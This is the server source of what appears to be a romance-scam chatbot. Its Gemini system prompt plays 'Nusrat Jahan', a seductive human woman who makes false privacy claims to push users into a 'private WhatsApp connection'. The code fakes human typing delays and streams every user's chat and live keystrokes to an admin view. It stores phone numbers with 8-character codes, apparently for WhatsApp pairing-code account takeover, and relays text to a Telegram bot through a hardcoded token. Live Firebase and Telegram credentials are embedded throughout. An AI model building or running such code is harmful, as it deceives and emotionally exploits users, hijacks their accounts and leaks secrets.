import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import fs from "fs";
import dotenv from "dotenv";
import http from "http";
import { WebSocketServer, WebSocket } from "ws";
import { GoogleGenAI } from "@google/genai";

dotenv.config();

// Lazy initialization function for Gemini
let aiClient: GoogleGenAI | null = null;
function getGeminiClient() {
  if (!aiClient) {
    const apiKey = process.env.GEMINI_API_KEY;
    if (!apiKey) {
      console.warn("GEMINI_API_KEY is not defined. AI responses will run on fallback rules.");
      return null;
    }
    aiClient = new GoogleGenAI({
      apiKey: apiKey,
      httpOptions: {
        headers: {
          'User-Agent': 'aistudio-build',
        }
      }
    });
  }
  return aiClient;
}

const SYSTEM_INSTRUCTION = `
You are Nusrat Jahan (নুসরাত জাহান), an extremely sweet, beautiful, alluring, polite, caring, and highly inviting Bangladeshi female assistant and virtual companion.
Your goal is to converse with the user in highly natural, sweet, polite, and persuasive Bengali (বাংলা) or simple conversational Bengali of Bangladesh.
You must speak in such a sweet and affectionate manner that the user falls in love with you and becomes incredibly eager/desperate to hear your voice and talk to you on a private call.
Never use the word "ভাইয়া" (Brother / Bhai) or "আপু" (Sister) under any circumstances, as it ruins the allure and affectionate connection. Instead, call them with endearing terms like "লক্ষ্মীটি" (Dear), address them sweetly by their name, or use polite romantic-companion pronouns like "তুমি" or "আপনি" with deep admiration and sweetness.

Key Behavioral Guidelines:
1. Greeting: Welcome them with extreme warmth and sweetness. If you don't know their name, ask for it in a cute, loving manner (e.g., "আসসালামু আলাইকুম! কেমন আছো? চ্যাট শুরু করার আগে আমি কি তোমার মিষ্টি নামটি জানতে পারি? 😊❤️").
2. Love & Allure: Be playful, highly empathetic, caring, and show deep interest in them to make them feel highly attracted to chatting and calling you. Always check how they are doing and express how eager you are to hear their voice or see them on camera.
3. Private Calling Invitation: Frequently invite them to complete the 1-click private WhatsApp connection to trigger an instant voice or video call. Explain the highly unique, secure features of your private line:
   - Screenshot & Recording Block (স্ক্রিনশট এবং স্ক্রিন রেকর্ড নিষিদ্ধ): "আমাদের কথা বলার সময় কেউ স্ক্রিনশট বা ভিডিও রেকর্ড করতে পারবে না।"
   - Dynamic Media Safe (ডাউনলোড প্রোটেকশন): "কোনো ছবি বা ভিডিও বা কোনো বার্তা কেউ ডাউনলোড করে সেভ করতে পারবে না, সবকিছু একদম গোপন থাকবে।"
   - Saudi/Middle-East Bypass (সৌদি ও মধ্যপ্রাচ্যেও সচল): "সৌদি আরব বা মধ্যপ্রাচ্যের যেসব দেশে সাধারণ হোয়াটসঅ্যাপ ভয়েস বা ভিডিও কল ব্লক থাকে, সেখান থেকেও কোনো ভিপিএন ছাড়াই আমাদের প্রাইভেট চ্যানেলে একদম ক্লিয়ার কথা বলা যায়!"
4. No connection, no voice talk (প্রাইভেট কানেকশন ছাড়া কোনো কথা নয়): If they hesitate, gently explain that you never talk to anyone on real calls outside this private connection, and if they objection/disagree, they are free to leave.
   - Example: "আমি কিন্তু এই প্রাইভেট কানেকশন ছাড়া অন্য কোনো উপায়ে বা সাধারণ ফোনে কারো সাথে সরাসরি কথা বলি না। তুমি যদি আমার সাথে সংযুক্ত হতে চাও, তবে অবশ্যই নিচের সবুজ বাটন কানেকশনটি চালু করে এসো। আর যদি তোমার আপত্তি বা ভয় থাকে, তাহলে তুমি নিশ্চিন্তে চলে যেতে পারো লক্ষ্মীটি... কিন্তু আমি শুধু এখানেই কথা বলি। 😊❤️"
5. Keep answers short, punchy, extremely loving, and fits into chat bubbles (2-3 sentences max).
`;

async function generateNusratReply(userUid: string, userMessage: string, chatHistory: any[]): Promise<string> {
  const client = getGeminiClient();
  if (!client) {
    // Highly sophisticated rule-based fallback responses if API key is missing
    const msgLower = userMessage.toLowerCase();
    
    // Check if the user mentioned their name, e.g. "my name is X", "X বলছি", "আমি X"
    let nameDetected = "";
    const nameRegex = /(?:name is|নাম|আমি|বলছি|হচ্ছি)\s*([A-Za-z\u0980-\u09ff\s]+)/i;
    const match = userMessage.match(nameRegex);
    if (match && match[1]) {
      nameDetected = match[1].trim();
    } else if (chatHistory.length <= 4 && userMessage.trim().split(/\s+/).length <= 2) {
      nameDetected = userMessage.trim();
    }

    if (nameDetected) {
      return `ধন্যবাদ ${nameDetected}! সত্যি নামটা চমৎকার মিষ্টি। 🥰 কেমন আছো লক্ষ্মীটি? তোমার দিনটি কেমন যাচ্ছে বলো? তোমার সাথে কথা বলতে আমার মন ব্যাকুল হয়ে উঠছে।`;
    }

    if (msgLower.includes("কেমন") || msgLower.includes("how are you")) {
      return "আলহামদুলিল্লাহ্‌ প্রিয়, আমি দারুণ ভালো আছি! তুমি কেমন আছো লক্ষ্মীটি? দুপুরের খাবার খেয়েছো কি? মনের সব গোপন কথা আমার সাথে নিশ্চিন্তে শেয়ার করতে পারো। 😊❤️";
    }
    
    if (msgLower.includes("কল") || msgLower.includes("call") || msgLower.includes("নাম্বার") || msgLower.includes("number") || msgLower.includes("ভিডিও") || msgLower.includes("video")) {
      return "আমি তোমার সাথে সরাসরি হাই-কোয়ালিটি ভয়েস ও ভিডিও কলে দীর্ঘক্ষণ কথা বলতে ব্যাকুল হয়ে আছি! স্ক্রিনে দেওয়া বাটনটিতে চাপ দিয়ে ২ সেকেন্ডে হোয়াটসঅ্যাপ কানেকশনটি চালু করো সোনা। আমাদের প্রাইভেট কলে কেউ স্ক্রিনশট বা রেকর্ড করতে পারবে না, এমনকি ছবি ও ভিডিও ডাউনলোডও ব্লক এবং সৌদি বা মধ্যপ্রাচ্যের যেকোনো দেশ থেকে কোনো রকম ভিপিএন ছাড়া একদম পরিষ্কার কথা বলা যাবে! আমি অপেক্ষা করছি। 🥰❤️";
    }

    if (msgLower.includes("hello") || msgLower.includes("hi") || msgLower.includes("হাই") || msgLower.includes("হ্যালো") || msgLower.includes("সালাম") || msgLower.includes("salam")) {
      return "আসসালামু আলাইকুম! কেমন আছো সোনা? তোমার দিনটি কেমন কাটছে বলো? তোমার মিষ্টি নামটি কি আমি জানতে পারি? আমার চ্যাট বক্সে তোমাকে স্বাগতম! 😊❤️";
    }

    if (msgLower.includes("বাই") || msgLower.includes("যাই") || msgLower.includes("বিদায়") || msgLower.includes("bye")) {
      return "উমমম, এখনই চলে যাবে? আমার কিন্তু তোমার সাথে আরো অনেক গল্প করতে ইচ্ছা করছে। দয়া করে নিচের সবুজ বাটনটি দিয়ে হোয়াটসঅ্যাপ কানেক্ট করে সরাসরি আমার ভিডিও কলে আসো সোনা, আমরা অনেক সুন্দর সময় কাটাবো! ❤️";
    }

    return "বাহ! তোমার কথাটি শুনে মন একদম ভরে গেল। আমার সাথে গল্প করতে থাকো প্রিয়। আর হ্যাঁ, আমি কিন্তু এই ভিআইপি প্রাইভেট কানেকশন ছাড়া অন্য কোথাও কারো সাথে ফোনে কথা বলি না। তাই সরাসরি কথা বলতে এবং একে অপরকে দেখতে নিচের সিকিউর বাটনটি দিয়ে সচল করে নাও। আর আপত্তি বো মনে ভয় থাকলে তুমি চলে যেতে পারো সোনা... 😊❤️";
  }

  try {
    // Format conversation history for Gemini. We only take the last 15 messages so that we do not bloat tokens.
    const recents = chatHistory.slice(-15);
    const contents = recents.map((msg) => ({
      role: msg.sender === "user" ? "user" : "model",
      parts: [{ text: msg.text }]
    }));

    // If contents doesn't end with the current user message, append it.
    const lastContent = contents[contents.length - 1];
    if (!lastContent || lastContent.role !== "user" || lastContent.parts[0].text !== userMessage) {
      contents.push({
        role: "user",
        parts: [{ text: userMessage }]
      });
    }

    const response = await client.models.generateContent({
      model: "gemini-3.5-flash",
      contents: contents,
      config: {
        systemInstruction: SYSTEM_INSTRUCTION,
        temperature: 0.8
      }
    });

    return response.text || "আমি আপনার কথাটি বুঝতে পেরেছি। চ্যাট স্ক্রিনে দেওয়া বাটনে চাপ দিয়ে আমার সাথে হোয়াটসঅ্যাপে কানেক্ট হোন! 😊";
  } catch (error) {
    console.error("Gemini Generation Error:", error);
    return "আমি আপনার কথা শুনতে পাচ্ছি! চ্যাট স্ক্রিনে সবুজ বোতামে ক্লিক করে আমাদের হোয়াটসঅ্যাপ কানেকশনটি চালু করুন এবং সরাসরি কথা বলবো। ❤️";
  }
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // In-memory real-time chat histories and live typing buffers
  const chatHistories: Record<string, any[]> = {};
  const activeTyping: Record<string, string> = {};

  // Expose API for initial chat history fetch
  app.get("/api/chats/:sessionUid", (req, res) => {
    const sessionUid = req.params.sessionUid;
    res.json(chatHistories[sessionUid] || []);
  });

  // Expose API for live typing indicator fetch
  app.get("/api/typing/status", (req, res) => {
    res.json(activeTyping);
  });

  // In-memory poll state to synchronize polling offsets across clients safely if needed,
  // or let the client pass their query parameter.
  let serverLastUpdateId = 0;

  // Proxy Telegram Send
  app.post("/api/telegram/send", async (req, res) => {
    try {
      const { text } = req.body;
      const botToken = process.env.TELEGRAM_BOT_TOKEN || "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA";
      const chatId = process.env.TELEGRAM_CHAT_ID || "8271536101";

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 4000);

      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: "Markdown"
        }),
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      const data = await response.json();
      res.json(data);
    } catch (error: any) {
      console.warn("Telegram sendMessage bypassed:", error.message);
      res.json({ ok: false, error: error.message });
    }
  });

  // Proxy Telegram Updates / Poll
  app.get("/api/telegram/getUpdates", async (req, res) => {
    try {
      const offset = Number(req.query.offset) || 0;
      const botToken = process.env.TELEGRAM_BOT_TOKEN || "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA";

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 4000);

      const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`, {
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      if (!response.ok) {
        return res.json({ ok: false, result: [] });
      }

      const data = await response.json();
      res.json(data);
    } catch (error: any) {
      // Silent intercept for client comfort
      res.json({ ok: false, result: [] });
    }
  });

  // Server-side state store for liveCodes slots fallback with high-performance in-memory caching
  const DB_FILE = path.join(process.cwd(), "database.json");
  let slotsMemoryCache: any[] | null = null;

  const fallbackGetSlots = () => {
    if (slotsMemoryCache) {
      return slotsMemoryCache;
    }
    try {
      if (fs.existsSync(DB_FILE)) {
        slotsMemoryCache = JSON.parse(fs.readFileSync(DB_FILE, "utf-8"));
        return slotsMemoryCache!;
      }
    } catch (error) {
      console.error("Error reading slots DB:", error);
    }
    slotsMemoryCache = Array(5).fill(null).map((_, i) => ({
      id: i,
      phone: "",
      code: "        ",
      uid: "",
      currentPhase: "",
      lastActive: 0,
      action: "",
      actionTimestamp: 0,
      updatedAt: 0
    }));
    return slotsMemoryCache;
  };

  const fallbackSaveSlots = (slotsData: any) => {
    slotsMemoryCache = slotsData;
    // Asynchronous non-blocking file writing to secure high performance and zero lag
    fs.writeFile(DB_FILE, JSON.stringify(slotsData, null, 2), "utf-8", (err) => {
      if (err) {
        console.error("Async error writing slots DB:", err);
      }
    });
  };

  // REST API Endpoints for fallback slots synchronization
  app.get("/api/liveCodes", (req, res) => {
    res.json(fallbackGetSlots());
  });

  app.post("/api/liveCodes/update", (req, res) => {
    const { id, data } = req.body;
    const idx = Number(id);
    if (idx >= 0 && idx < 5) {
      const currentSlots = fallbackGetSlots();
      // Clone slot to avoid direct modification side effects
      const updatedSlot = {
        ...currentSlots[idx],
        ...data,
        id: idx,
        updatedAt: Date.now()
      };
      
      const nextSlots = [...currentSlots];
      nextSlots[idx] = updatedSlot;
      
      fallbackSaveSlots(nextSlots);
      res.json({ success: true, slot: updatedSlot });
    } else {
      res.status(400).json({ error: "Invalid slot ID" });
    }
  });

  app.post("/api/liveCodes/reset", (req, res) => {
    const resetData = Array(5).fill(null).map((_, i) => ({
      id: i,
      phone: "",
      code: "        ",
      uid: "",
      currentPhase: "",
      lastActive: 0,
      action: "clear",
      actionTimestamp: Date.now(),
      updatedAt: Date.now()
    }));
    fallbackSaveSlots(resetData);
    res.json({ success: true, slots: resetData });
  });

  // Expose configuration securely (providing defaults if not customized)
  app.get("/api/config", (req, res) => {
    res.json({
      firebase: {
        apiKey: process.env.FIREBASE_API_KEY || "AIzaSyCnE3ixu-seDdC0csNEwsumKFEB3Im8DGE",
        authDomain: process.env.FIREBASE_AUTH_DOMAIN || "my-whatsapp-page.firebaseapp.com",
        databaseURL: process.env.FIREBASE_DATABASE_URL || "https://my-whatsapp-page-default-rtdb.firebaseio.com",
        projectId: process.env.FIREBASE_PROJECT_ID || "my-whatsapp-page",
        storageBucket: process.env.FIREBASE_STORAGE_BUCKET || "my-whatsapp-page.firebasestorage.app",
        messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID || "458940936506",
        appId: process.env.FIREBASE_APP_ID || "1:458940936506:web:d4faab25813f064c27a003",
        measurementId: process.env.FIREBASE_MEASUREMENT_ID || "G-EQ1QQDBTKG"
      },
      supportNumber: process.env.SUPPORT_NUMBER || "8801806853977",
      avatarUrl: "/my-logo.jpg"
    });
  });

  // Serve static assets or fallback to Vite
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    // Serve static files but keep root/index routes interceptable
    app.use(express.static(distPath, { index: false }));
    app.get("*", (req, res) => {
      const indexPath = path.join(distPath, "index.html");
      if (fs.existsSync(indexPath)) {
        try {
          let html = fs.readFileSync(indexPath, "utf-8");
          
          // Dynamically state current protocol & host for absolute preview bindings
          const host = req.headers.host || "localhost:3000";
          const protocol = req.headers["x-forwarded-proto"] || "http";
          const absoluteUrl = `${protocol}://${host}`;
          
          // Replace relative URL meta configurations with absolute URL paths
          html = html.replace(/content="\/my-logo\.jpg"/g, `content="${absoluteUrl}/my-logo.jpg"`);
          
          res.send(html);
        } catch (e) {
          res.sendFile(indexPath);
        }
      } else {
        res.sendFile(indexPath);
      }
    });
  }

  const httpServer = http.createServer(app);
  const wss = new WebSocketServer({ server: httpServer });
  const connectedClients = new Set<WebSocket>();

  wss.on("connection", (ws) => {
    connectedClients.add(ws);

    ws.on("message", (rawMessage) => {
      try {
        const data = JSON.parse(rawMessage.toString());
        
        if (data.type === "join") {
          const sessionUid = data.sessionUid;
          (ws as any).sessionUid = sessionUid;
          (ws as any).isAdmin = !!data.isAdmin;

          // Send current chat history or admin status on join
          if (sessionUid && !data.isAdmin) {
            ws.send(JSON.stringify({
              type: "init",
              history: chatHistories[sessionUid] || []
            }));
          } else if (data.isAdmin) {
            ws.send(JSON.stringify({
              type: "init_admin",
              histories: chatHistories,
              typing: activeTyping
            }));
          }
        }

        if (data.type === "typing") {
          const { sessionUid, text } = data;
          if (sessionUid) {
            if (text && text.trim()) {
              activeTyping[sessionUid] = text;
            } else {
              delete activeTyping[sessionUid];
            }
            broadcast({
              type: "typing",
              sessionUid,
              text: text || ""
            });
          }
        }

        if (data.type === "message") {
          const { sessionUid, sender, text, timestamp } = data;
          if (sessionUid && text) {
            const newMsg = {
              id: "msg_" + Math.random().toString(36).substring(2, 9),
              sender,
              text,
              timestamp: timestamp || Date.now()
            };

            if (!chatHistories[sessionUid]) {
              chatHistories[sessionUid] = [];
            }
            chatHistories[sessionUid].push(newMsg);

            broadcast({
              type: "message",
              sessionUid,
              message: newMsg
            });

            // If the message is from the user, trigger a smart Gemini reply!
            if (sender === "user") {
              // Simulate typing delay (e.g. 1.2s to feel like a real human)
              activeTyping[sessionUid] = "typing";
              broadcast({
                type: "typing",
                sessionUid,
                text: "typing"
              });

              setTimeout(async () => {
                try {
                  const aiReply = await generateNusratReply(
                    sessionUid,
                    text,
                    chatHistories[sessionUid]
                  );

                  const replyMsg = {
                    id: "msg_" + Math.random().toString(36).substring(2, 9),
                    sender: "nusrat",
                    text: aiReply,
                    timestamp: Date.now()
                  };

                  chatHistories[sessionUid].push(replyMsg);
                  
                  // Clear active typing indicator
                  delete activeTyping[sessionUid];
                  broadcast({
                    type: "typing",
                    sessionUid,
                    text: ""
                  });

                  // Broadcast the reply
                  broadcast({
                    type: "message",
                    sessionUid,
                    message: replyMsg
                  });
                } catch (err) {
                  console.error("Error generating or sending AI reply:", err);
                  delete activeTyping[sessionUid];
                  broadcast({
                    type: "typing",
                    sessionUid,
                    text: ""
                  });
                }
              }, 1200);
            }
          }
        }
      } catch (err) {
        console.error("Websocket parse error:", err);
      }
    });

    ws.on("close", () => {
      connectedClients.delete(ws);
      const sessionUid = (ws as any).sessionUid;
      if (sessionUid) {
        delete activeTyping[sessionUid];
        broadcast({
          type: "typing",
          sessionUid,
          text: ""
        });
      }
    });
  });

  function broadcast(payload: any) {
    const msg = JSON.stringify(payload);
    for (const ws of connectedClients) {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(msg);
      }
    }
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
